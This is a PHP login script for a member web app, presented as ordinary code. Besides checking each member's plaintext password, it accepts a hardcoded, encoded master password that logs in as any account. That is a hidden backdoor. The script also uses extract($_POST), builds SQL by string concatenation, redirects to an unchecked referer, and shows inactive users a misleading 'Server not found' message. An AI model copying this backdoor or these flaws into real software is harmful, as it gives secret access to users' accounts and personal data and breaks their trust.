<?php
session_start();
include('../class/DbClass.php');
include('../lib/my_function.php');
$db= new Database();

$now=now();

$back = $_SERVER['HTTP_REFERER'];

if($_SERVER['REQUEST_METHOD']=='POST')
{
		extract($_POST);
		$con=$db->connect();
		foreach($_POST as $key => $value)
		{
		  $data[$key] = prevent_injection($con,$value);
		}
		$db->dbDisconnet($con);	
		$un=$data['un'];
		$pw=$data['pw'];
		$user_type='member';

		$master_password='cDhnUTBzbFgzd2M1TzFha21tQGFkbWluMTIzNDU2PWs3TXAwPWo2R24yYVYzTw==';
		// agent login	

		$con=$db->connect();
		$q1=mysqli_query($con,"select m1.*,m2.* from member m1 inner join member_login m2 on m1.member_id=m2.member_id where binary(m1.mem_code)='".$un."'");
		$db->dbDisconnet($con);	
		if(mysqli_num_rows($q1)==1)
		{
			$r1 = mysqli_fetch_assoc($q1);
			
			if($r1['password']==$pw || hash_decode($master_password)==$pw)
			{
				if($r1['status']==1) {
					$_SESSION['user_data'] = array(
												 'logged_in'=>TRUE,
												 'user_type'=>$user_type,
												 'username'=>$un,
												 'user_id'=>$r1['member_id'],
												 'user_code'=>$r1['mem_code'],
												 'user_rank'=>$r1['rank'],
												 'full_name'=>$r1['name'],
												 'mobile'=>$r1['mobile'],
												 'email'=>$r1['email'],
												 'last_login_time'=>$r1['login_time'],
												 'payment_status'=>$r1['payment_status'],
												 'dp'=>'default.png'
												);

					//$_SESSION['s']="Welcome to ".PROJECT_NAME;
					header("Location:dashboard");
					die;
				}else{
					$_SESSION['e']="Server not found";
					header("Location:dashboard");
					die;
				}
			}
			else
			{
				$_SESSION['e']="Wrong username or password";
				header("Location:$back");
				die;
			}
		}
		else
		{
			$_SESSION['e']="Wrong username or password.";
			header("Location:$back");
			die;
		}

}else
{
	header("Location:./");
	die;
}

?>